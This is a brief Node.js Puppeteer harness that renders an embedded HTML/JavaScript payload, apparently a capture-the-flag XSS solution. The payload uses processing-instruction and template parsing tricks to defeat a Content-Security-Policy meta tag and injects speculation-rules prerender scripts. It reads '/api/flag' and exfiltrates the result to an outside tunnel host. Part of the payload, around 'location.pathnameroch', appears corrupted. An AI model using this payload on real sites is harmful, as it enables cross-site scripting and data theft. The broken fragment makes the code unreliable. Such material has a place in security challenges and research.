const puppeteer = require('puppeteer');
const source = `<!doctype html><?start name="x"><script>r=location.href.slice(-24),S=u=>document.write('<script type=speculationrules>{"prerender":[{"urls":["'+u+'"]}]}<\\/script>');onmessage=e=>e.ports[0].postMessage('ready');location.pathnameroch>'/s multiline'?(S('/review?rid='+r),setTimeout(()=>S(location='/reports/check?rid='+r),2e3)):fetch('/api/flag').then(x=>x.text()).then(x=>location='//eb7f08a05be4f4.lhr.life?'+x)</script><?end><template for=x><meta content="default-src 'none'"http-equiv=content-security-policy></template><div>`;
(async()=>{
  const b=await puppeteer.launch({executablePath:process.env.CHROME_PATH,headless:'new'});
  const p=await b.newPage(); await p.setJavaScriptEnabled(false); await p.setContent(source);
  console.log(source.length, await p.evaluate(()=>document.documentElement.outerHTML));
  await b.close();
})();
